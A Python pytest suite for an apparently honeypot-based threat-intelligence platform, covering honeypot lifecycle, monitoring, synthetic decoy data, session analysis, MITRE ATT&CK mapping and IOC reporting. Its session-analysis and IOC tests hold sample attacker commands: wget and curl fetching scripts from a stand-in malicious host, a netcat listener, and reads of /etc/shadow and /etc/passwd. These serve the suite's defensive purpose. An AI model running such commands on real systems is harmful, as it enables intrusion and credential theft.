"""
Comprehensive unit tests for agent components and their interactions
"""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime, timedelta
import json

from agents.base_agent import BaseAgent
from agents.coordinator.honeypot_manager import HoneypotManager
from agents.coordinator.monitoring_system import SystemMonitoringSystem
from agents.coordinator.orchestration_engine import OrchestrationEngine
from agents.interaction.security_controls import SecurityControls
from agents.interaction.synthetic_data_generator import SyntheticDataGenerator
from agents.intelligence.session_analyzer import SessionAnalyzer
from agents.intelligence.mitre_mapper import MitreAttackMapper
from agents.intelligence.intelligence_reporter import IntelligenceReporter


# Note: BaseAgent is abstract and cannot be tested directly
# Individual agent implementations are tested in their respective test files


@pytest.mark.unit
@pytest.mark.agents
class TestHoneypotManager:
    """Test Honeypot Manager functionality"""

    def test_initialization(self):
        """Test Honeypot Manager initialization"""
        # Create mock coordinator agent
        mock_coordinator = MagicMock()
        mock_coordinator.config = {
            "max_concurrent_honeypots": 10,
            "honeypot_timeout": 3600,
            "supported_types": ["ssh", "web_admin", "database", "email"]
        }
        
        manager = HoneypotManager(mock_coordinator)
        # Test that manager is properly initialized
        assert manager is not None
        assert hasattr(manager, 'honeypot_instances')
        assert hasattr(manager, 'coordinator_agent')
        assert manager.coordinator_agent == mock_coordinator

    async def test_create_honeypot(self):
        """Test honeypot creation"""
        manager = HoneypotManager({})
        
        honeypot_config = {
            "type": "ssh",
            "priority": "high",
            "duration": 3600,
            "synthetic_data": True
        }
        
        result = await manager.create_honeypot(honeypot_config)
        
        assert result["created"] is True
        assert "honeypot_id" in result
        assert result["type"] == "ssh"

    async def test_destroy_honeypot(self):
        """Test honeypot destruction"""
        manager = HoneypotManager({})
        
        # Create a honeypot first
        create_result = await manager.create_honeypot({"type": "ssh"})
        honeypot_id = create_result["honeypot_id"]
        
        # Destroy it
        destroy_result = await manager.destroy_honeypot(honeypot_id)
        
        assert destroy_result["destroyed"] is True
        assert destroy_result["honeypot_id"] == honeypot_id

    async def test_honeypot_lifecycle_management(self):
        """Test honeypot lifecycle management"""
        manager = HoneypotManager({"honeypot_timeout": 10})  # 10 second timeout for testing
        
        # Create honeypot
        create_result = await manager.create_honeypot({"type": "web_admin"})
        honeypot_id = create_result["honeypot_id"]
        
        # Check status
        status_result = await manager.get_honeypot_status(honeypot_id)
        assert status_result["status"] == "active"
        
        # Test automatic cleanup (would normally happen after timeout)
        cleanup_result = await manager.cleanup_expired_honeypots()
        assert "cleaned_up" in cleanup_result

    async def test_honeypot_scaling(self):
        """Test honeypot auto-scaling"""
        manager = HoneypotManager({"max_concurrent_honeypots": 3})
        
        # Create multiple honeypots
        honeypot_ids = []
        for i in range(5):  # Try to create more than max
            result = await manager.create_honeypot({"type": "ssh", "priority": "medium"})
            if result.get("created"):
                honeypot_ids.append(result["honeypot_id"])
        
        # Should not exceed max concurrent limit
        active_count = await manager.get_active_honeypot_count()
        assert active_count <= 3

    async def test_honeypot_resource_management(self):
        """Test honeypot resource management"""
        manager = HoneypotManager({})
        
        resource_request = {
            "cpu_cores": 2,
            "memory_mb": 1024,
            "storage_gb": 10,
            "network_bandwidth": "100mbps"
        }
        
        result = await manager.allocate_resources(resource_request)
        
        assert result["allocated"] is True
        assert "resource_id" in result


@pytest.mark.unit
@pytest.mark.agents
class TestSystemMonitoringSystem:
    """Test System Monitoring System functionality"""

    def test_initialization(self):
        """Test System Monitoring System initialization"""
        config = {
            "monitoring_interval": 30,
            "alert_thresholds": {
                "cpu_usage": 80,
                "memory_usage": 85,
                "error_rate": 5
            }
        }
        
        system = SystemMonitoringSystem(config)
        assert system.config == config
        assert system.monitoring_interval == 30

    async def test_system_health_monitoring(self):
        """Test system health monitoring"""
        system = SystemMonitoringSystem({})
        
        health_data = await system.collect_system_health()
        
        assert "cpu_usage" in health_data
        assert "memory_usage" in health_data
        assert "disk_usage" in health_data
        assert "network_stats" in health_data

    async def test_agent_monitoring(self):
        """Test agent monitoring"""
        system = SystemMonitoringSystem({})
        
        agent_data = {
            "agent_id": "detection-agent-1",
            "agent_type": "detection",
            "status": "running",
            "last_heartbeat": datetime.utcnow().isoformat()
        }
        
        result = await system.monitor_agent(agent_data)
        
        assert result["monitored"] is True
        assert "health_score" in result

    async def test_performance_metrics(self):
        """Test performance metrics collection"""
        system = SystemMonitoringSystem({})
        
        metrics = await system.collect_performance_metrics()
        
        assert "response_times" in metrics
        assert "throughput" in metrics
        assert "error_rates" in metrics
        assert "resource_utilization" in metrics

    async def test_alert_generation(self):
        """Test alert generation based on thresholds"""
        system = SystemMonitoringSystem({
            "alert_thresholds": {"cpu_usage": 50}  # Low threshold for testing
        })
        
        # Simulate high CPU usage
        system_data = {
            "cpu_usage": 75,  # Above threshold
            "memory_usage": 40,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        result = await system.check_alert_conditions(system_data)
        
        assert result["alerts_generated"] > 0
        assert any(alert["type"] == "cpu_usage" for alert in result["alerts"])

    async def test_monitoring_dashboard_data(self):
        """Test monitoring dashboard data generation"""
        system = SystemMonitoringSystem({})
        
        dashboard_data = await system.generate_monitoring_dashboard()
        
        assert "system_overview" in dashboard_data
        assert "agent_status" in dashboard_data
        assert "performance_charts" in dashboard_data
        assert "recent_alerts" in dashboard_data


@pytest.mark.unit
@pytest.mark.agents
class TestOrchestrationEngine:
    """Test Orchestration Engine functionality"""

    def test_initialization(self):
        """Test Orchestration Engine initialization"""
        config = {
            "max_concurrent_workflows": 5,
            "workflow_timeout": 1800,
            "retry_attempts": 3
        }
        
        engine = OrchestrationEngine(config)
        assert engine.config == config
        assert engine.max_concurrent_workflows == 5

    async def test_workflow_creation(self):
        """Test workflow creation and execution"""
        engine = OrchestrationEngine({})
        
        workflow_config = {
            "name": "threat_response_workflow",
            "steps": [
                {"action": "create_honeypot", "type": "ssh"},
                {"action": "notify_agents", "target": "interaction"},
                {"action": "start_monitoring", "duration": 3600}
            ]
        }
        
        result = await engine.create_workflow(workflow_config)
        
        assert result["created"] is True
        assert "workflow_id" in result

    async def test_workflow_execution(self):
        """Test workflow step execution"""
        engine = OrchestrationEngine({})
        
        # Create workflow first
        workflow_result = await engine.create_workflow({
            "name": "test_workflow",
            "steps": [{"action": "test_step", "data": "test"}]
        })
        
        # Execute workflow
        execution_result = await engine.execute_workflow(workflow_result["workflow_id"])
        
        assert execution_result["started"] is True
        assert "execution_id" in execution_result

    async def test_workflow_monitoring(self):
        """Test workflow monitoring and status tracking"""
        engine = OrchestrationEngine({})
        
        # Create and start workflow
        workflow_result = await engine.create_workflow({"name": "monitor_test"})
        execution_result = await engine.execute_workflow(workflow_result["workflow_id"])
        
        # Monitor execution
        status = await engine.get_workflow_status(execution_result["execution_id"])
        
        assert "status" in status
        assert "progress" in status
        assert "current_step" in status

    async def test_workflow_error_handling(self):
        """Test workflow error handling and recovery"""
        engine = OrchestrationEngine({"retry_attempts": 2})
        
        # Create workflow with failing step
        workflow_config = {
            "name": "error_test_workflow",
            "steps": [
                {"action": "failing_step", "should_fail": True},
                {"action": "recovery_step", "data": "recovery"}
            ]
        }
        
        workflow_result = await engine.create_workflow(workflow_config)
        execution_result = await engine.execute_workflow(workflow_result["workflow_id"])
        
        # Check error handling
        status = await engine.get_workflow_status(execution_result["execution_id"])
        assert "error_count" in status
        assert "retry_count" in status


@pytest.mark.unit
@pytest.mark.agents
class TestSecurityControls:
    """Test Security Controls functionality"""

    def test_initialization(self):
        """Test Security Controls initialization"""
        config = {
            "real_data_detection": True,
            "quarantine_enabled": True,
            "escalation_thresholds": {"confidence": 0.8}
        }
        
        controls = SecurityControls(config)
        assert controls.config == config
        assert controls.real_data_detection is True

    async def test_real_data_detection(self):
        """Test real data detection"""
        controls = SecurityControls({})
        
        # Test with potential real data
        suspicious_input = {
            "username": "john.doe@company.com",
            "password": "RealPassword123!",
            "context": "login_attempt"
        }
        
        result = await controls.detect_real_data(suspicious_input)
        
        assert "is_real_data" in result
        assert "confidence" in result
        assert "indicators" in result

    async def test_synthetic_data_validation(self):
        """Test synthetic data validation"""
        controls = SecurityControls({})
        
        # Test with synthetic data
        synthetic_input = {
            "username": "admin_synthetic",
            "password": "SyntheticPass123!",
            "synthetic": True,
            "fingerprint": "fp-test-123"
        }
        
        result = await controls.validate_synthetic_data(synthetic_input)
        
        assert result["valid"] is True
        assert result["synthetic"] is True

    async def test_escalation_procedures(self):
        """Test security escalation procedures"""
        controls = SecurityControls({"escalation_thresholds": {"confidence": 0.7}})
        
        security_event = {
            "type": "real_data_detected",
            "confidence": 0.9,  # Above threshold
            "severity": "high",
            "details": "Real credentials detected in SSH session"
        }
        
        result = await controls.handle_security_escalation(security_event)
        
        assert result["escalated"] is True
        assert "escalation_id" in result

    async def test_session_isolation(self):
        """Test session isolation controls"""
        controls = SecurityControls({})
        
        isolation_request = {
            "session_id": "session-123",
            "reason": "suspicious_activity",
            "isolation_level": "network"
        }
        
        result = await controls.isolate_session(isolation_request)
        
        assert result["isolated"] is True
        assert result["session_id"] == "session-123"

    async def test_emergency_shutdown(self):
        """Test emergency shutdown procedures"""
        controls = SecurityControls({})
        
        shutdown_request = {
            "reason": "security_breach",
            "scope": "all_honeypots",
            "immediate": True
        }
        
        result = await controls.emergency_shutdown(shutdown_request)
        
        assert result["shutdown_initiated"] is True
        assert result["scope"] == "all_honeypots"


@pytest.mark.unit
@pytest.mark.agents
class TestSyntheticDataGenerator:
    """Test Synthetic Data Generator functionality"""

    def test_initialization(self):
        """Test Synthetic Data Generator initialization"""
        config = {
            "data_types": ["credentials", "files", "network", "emails"],
            "fingerprinting": True,
            "quality_level": "high"
        }
        
        generator = SyntheticDataGenerator(config)
        assert generator.config == config
        assert "credentials" in generator.data_types

    async def test_credential_generation(self):
        """Test synthetic credential generation"""
        generator = SyntheticDataGenerator({})
        
        cred_params = {
            "type": "admin_user",
            "complexity": "high",
            "count": 5
        }
        
        result = await generator.generate_credentials(cred_params)
        
        assert len(result["credentials"]) == 5
        for cred in result["credentials"]:
            assert cred["synthetic"] is True
            assert "fingerprint" in cred
            assert "username" in cred
            assert "password" in cred

    async def test_file_system_generation(self):
        """Test synthetic file system generation"""
        generator = SyntheticDataGenerator({})
        
        fs_params = {
            "type": "linux_server",
            "depth": 3,
            "file_count": 50
        }
        
        result = await generator.generate_file_system(fs_params)
        
        assert result["synthetic"] is True
        assert "structure" in result
        assert "files" in result
        assert len(result["files"]) <= 50

    async def test_network_data_generation(self):
        """Test synthetic network data generation"""
        generator = SyntheticDataGenerator({})
        
        network_params = {
            "type": "corporate_network",
            "subnet_count": 3,
            "host_count": 20
        }
        
        result = await generator.generate_network_data(network_params)
        
        assert result["synthetic"] is True
        assert "subnets" in result
        assert "hosts" in result
        assert len(result["hosts"]) <= 20

    async def test_document_generation(self):
        """Test synthetic document generation"""
        generator = SyntheticDataGenerator({})
        
        doc_params = {
            "type": "corporate_documents",
            "categories": ["policies", "procedures", "reports"],
            "count": 10
        }
        
        result = await generator.generate_documents(doc_params)
        
        assert len(result["documents"]) == 10
        for doc in result["documents"]:
            assert doc["synthetic"] is True
            assert "fingerprint" in doc
            assert doc["category"] in doc_params["categories"]

    async def test_data_fingerprinting(self):
        """Test synthetic data fingerprinting"""
        generator = SyntheticDataGenerator({"fingerprinting": True})
        
        data = {
            "username": "test_user",
            "email": "test@example.com"
        }
        
        result = await generator.add_fingerprint(data)
        
        assert result["synthetic"] is True
        assert "fingerprint" in result
        assert "creation_timestamp" in result

    async def test_data_quality_validation(self):
        """Test synthetic data quality validation"""
        generator = SyntheticDataGenerator({"quality_level": "high"})
        
        generated_data = {
            "username": "admin_synthetic",
            "password": "SyntheticPass123!",
            "synthetic": True,
            "fingerprint": "fp-test-123"
        }
        
        result = await generator.validate_data_quality(generated_data)
        
        assert result["quality_score"] > 0.8
        assert result["meets_standards"] is True


@pytest.mark.unit
@pytest.mark.agents
class TestSessionAnalyzer:
    """Test Session Analyzer functionality"""

    def test_initialization(self):
        """Test Session Analyzer initialization"""
        config = {
            "analysis_depth": "comprehensive",
            "confidence_threshold": 0.7,
            "mitre_mapping": True
        }
        
        analyzer = SessionAnalyzer(config)
        assert analyzer.config == config
        assert analyzer.analysis_depth == "comprehensive"

    async def test_session_transcript_analysis(self):
        """Test session transcript analysis"""
        analyzer = SessionAnalyzer({})
        
        session_data = {
            "session_id": "session-123",
            "transcript": [
                {"timestamp": "2024-01-01T10:00:00Z", "command": "whoami", "response": "root"},
                {"timestamp": "2024-01-01T10:01:00Z", "command": "ls -la", "response": "total 24\n..."},
                {"timestamp": "2024-01-01T10:02:00Z", "command": "cat /etc/passwd", "response": "root:x:0:0:..."}
            ]
        }
        
        result = await analyzer.analyze_session_transcript(session_data)
        
        assert "analysis_id" in result
        assert "techniques_identified" in result
        assert "confidence_score" in result
        assert "behavioral_patterns" in result

    async def test_command_pattern_analysis(self):
        """Test command pattern analysis"""
        analyzer = SessionAnalyzer({})
        
        commands = [
            "whoami", "id", "uname -a", "ps aux", "netstat -an",
            "find / -name '*.conf'", "cat /etc/shadow"
        ]
        
        result = await analyzer.analyze_command_patterns(commands)
        
        assert "pattern_type" in result
        assert "attack_phase" in result
        assert "confidence" in result

    async def test_behavioral_analysis(self):
        """Test behavioral analysis"""
        analyzer = SessionAnalyzer({})
        
        behavior_data = {
            "session_duration": 1800,  # 30 minutes
            "command_frequency": 0.5,  # commands per second
            "error_rate": 0.1,
            "privilege_escalation_attempts": 2,
            "lateral_movement_indicators": 1
        }
        
        result = await analyzer.analyze_behavior(behavior_data)
        
        assert "behavior_profile" in result
        assert "threat_level" in result
        assert "indicators" in result

    async def test_intelligence_extraction(self):
        """Test intelligence extraction from sessions"""
        analyzer = SessionAnalyzer({})
        
        session_data = {
            "session_id": "session-123",
            "attacker_ip": "192.168.1.100",
            "commands": ["nmap -sS 10.0.0.0/24", "wget http://malicious.com/tool.sh"],
            "files_accessed": ["/etc/passwd", "/var/log/auth.log"],
            "network_connections": ["10.0.0.50:22", "8.8.8.8:53"]
        }
        
        result = await analyzer.extract_intelligence(session_data)
        
        assert "iocs" in result
        assert "ttps" in result
        assert "attribution_indicators" in result


@pytest.mark.unit
@pytest.mark.agents
class TestMitreAttackMapper:
    """Test MITRE ATT&CK Mapper functionality"""

    def test_initialization(self):
        """Test MITRE ATT&CK Mapper initialization"""
        config = {
            "mitre_version": "v12.1",
            "confidence_threshold": 0.6,
            "include_sub_techniques": True
        }
        
        mapper = MitreAttackMapper(config)
        assert mapper.config == config
        assert mapper.mitre_version == "v12.1"

    async def test_command_to_technique_mapping(self):
        """Test command to MITRE technique mapping"""
        mapper = MitreAttackMapper({})
        
        commands = [
            "whoami",
            "net user /domain",
            "powershell -enc <base64>",
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        ]
        
        for command in commands:
            result = await mapper.map_command_to_technique(command)
            
            assert "technique_id" in result
            assert "technique_name" in result
            assert "tactic" in result
            assert "confidence" in result

    async def test_session_technique_mapping(self):
        """Test session-level technique mapping"""
        mapper = MitreAttackMapper({})
        
        session_data = {
            "commands": ["whoami", "id", "ps aux", "netstat -an"],
            "files_accessed": ["/etc/passwd", "/proc/version"],
            "network_activity": ["outbound_connection_8.8.8.8:53"]
        }
        
        result = await mapper.map_session_techniques(session_data)
        
        assert "techniques" in result
        assert "tactics" in result
        assert "confidence_scores" in result

    async def test_attack_navigator_layer_generation(self):
        """Test ATT&CK Navigator layer generation"""
        mapper = MitreAttackMapper({})
        
        techniques = ["T1078", "T1059.004", "T1083", "T1057"]
        
        result = await mapper.generate_navigator_layer(techniques)
        
        assert "name" in result
        assert "version" in result
        assert "techniques" in result
        assert len(result["techniques"]) == len(techniques)

    async def test_technique_statistics(self):
        """Test technique usage statistics"""
        mapper = MitreAttackMapper({})
        
        session_ids = ["session-1", "session-2", "session-3"]
        
        result = await mapper.generate_technique_statistics(session_ids)
        
        assert "technique_frequency" in result
        assert "tactic_distribution" in result
        assert "most_common_techniques" in result


@pytest.mark.unit
@pytest.mark.agents
class TestIntelligenceReporter:
    """Test Intelligence Reporter functionality"""

    def test_initialization(self):
        """Test Intelligence Reporter initialization"""
        config = {
            "report_formats": ["json", "pdf", "stix"],
            "confidence_threshold": 0.7,
            "include_raw_data": False
        }
        
        reporter = IntelligenceReporter(config)
        assert reporter.config == config
        assert "json" in reporter.report_formats

    async def test_intelligence_report_generation(self):
        """Test intelligence report generation"""
        reporter = IntelligenceReporter({})
        
        intelligence_data = {
            "session_id": "session-123",
            "techniques": ["T1078", "T1059.004"],
            "iocs": [
                {"type": "ip", "value": "192.168.1.100", "confidence": 0.9},
                {"type": "command", "value": "whoami", "confidence": 0.7}
            ],
            "confidence_score": 0.85
        }
        
        result = await reporter.generate_intelligence_report(intelligence_data)
        
        assert "report_id" in result
        assert "executive_summary" in result
        assert "technical_details" in result
        assert "recommendations" in result

    async def test_ioc_extraction_and_formatting(self):
        """Test IOC extraction and formatting"""
        reporter = IntelligenceReporter({})
        
        session_data = {
            "commands": ["curl http://malicious.com/payload.sh", "nc -l 4444"],
            "network_connections": ["192.168.1.100:4444", "malicious.com:80"],
            "file_hashes": ["d41d8cd98f00b204e9800998ecf8427e"]
        }
        
        result = await reporter.extract_and_format_iocs(session_data)
        
        assert "iocs" in result
        assert len(result["iocs"]) > 0
        for ioc in result["iocs"]:
            assert "type" in ioc
            assert "value" in ioc
            assert "confidence" in ioc

    async def test_threat_assessment(self):
        """Test threat assessment generation"""
        reporter = IntelligenceReporter({})
        
        threat_data = {
            "techniques": ["T1078", "T1059.004", "T1083"],
            "tactics": ["Initial Access", "Execution", "Discovery"],
            "session_duration": 1800,
            "commands_executed": 25,
            "privilege_escalation": True
        }
        
        result = await reporter.generate_threat_assessment(threat_data)
        
        assert "threat_level" in result
        assert "sophistication" in result
        assert "impact_assessment" in result
        assert "attribution_indicators" in result

    async def test_report_export(self):
        """Test report export in different formats"""
        reporter = IntelligenceReporter({"report_formats": ["json", "pdf"]})
        
        report_data = {
            "report_id": "report-123",
            "title": "Test Intelligence Report",
            "content": {"summary": "Test report content"}
        }
        
        # Test JSON export
        json_result = await reporter.export_report(report_data, "json")
        assert json_result["format"] == "json"
        assert "exported_data" in json_result
        
        # Test PDF export
        pdf_result = await reporter.export_report(report_data, "pdf")
        assert pdf_result["format"] == "pdf"
        assert "file_path" in pdf_result or "binary_data" in pdf_result


@pytest.mark.unit
@pytest.mark.agents
class TestAgentIntegration:
    """Test agent component integration"""

    async def test_coordinator_honeypot_integration(self):
        """Test coordinator and honeypot manager integration"""
        honeypot_manager = HoneypotManager({})
        orchestration_engine = OrchestrationEngine({})
        
        # Create workflow that includes honeypot creation
        workflow_config = {
            "name": "threat_response",
            "steps": [
                {"action": "create_honeypot", "type": "ssh", "priority": "high"}
            ]
        }
        
        workflow_result = await orchestration_engine.create_workflow(workflow_config)
        assert workflow_result["created"] is True
        
        # Execute honeypot creation step
        honeypot_result = await honeypot_manager.create_honeypot({
            "type": "ssh", "priority": "high"
        })
        assert honeypot_result["created"] is True

    async def test_interaction_security_integration(self):
        """Test interaction agent and security controls integration"""
        security_controls = SecurityControls({})
        synthetic_generator = SyntheticDataGenerator({})
        
        # Generate synthetic data
        cred_result = await synthetic_generator.generate_credentials({
            "type": "admin_user", "count": 1
        })
        synthetic_creds = cred_result["credentials"][0]
        
        # Validate with security controls
        validation_result = await security_controls.validate_synthetic_data(synthetic_creds)
        assert validation_result["valid"] is True
        assert validation_result["synthetic"] is True

    async def test_intelligence_analysis_integration(self):
        """Test intelligence analysis component integration"""
        session_analyzer = SessionAnalyzer({})
        mitre_mapper = MitreAttackMapper({})
        intelligence_reporter = IntelligenceReporter({})
        
        # Analyze session
        session_data = {
            "session_id": "session-123",
            "transcript": [
                {"command": "whoami", "response": "root"},
                {"command": "id", "response": "uid=0(root) gid=0(root)"}
            ]
        }
        
        analysis_result = await session_analyzer.analyze_session_transcript(session_data)
        assert "techniques_identified" in analysis_result
        
        # Map to MITRE techniques
        mitre_result = await mitre_mapper.map_session_techniques({
            "commands": ["whoami", "id"]
        })
        assert "techniques" in mitre_result
        
        # Generate intelligence report
        report_result = await intelligence_reporter.generate_intelligence_report({
            "session_id": "session-123",
            "techniques": mitre_result["techniques"],
            "confidence_score": 0.8
        })
        assert "report_id" in report_result

    async def test_monitoring_alerting_integration(self):
        """Test monitoring and alerting integration"""
        monitoring_system = SystemMonitoringSystem({
            "alert_thresholds": {"error_rate": 5}
        })
        
        # Simulate system data that triggers alert
        system_data = {
            "error_rate": 10,  # Above threshold
            "timestamp": datetime.utcnow().isoformat()
        }
        
        alert_result = await monitoring_system.check_alert_conditions(system_data)
        assert alert_result["alerts_generated"] > 0
        
        # Verify alert contains proper information
        alerts = alert_result["alerts"]
        assert any(alert["type"] == "error_rate" for alert in alerts)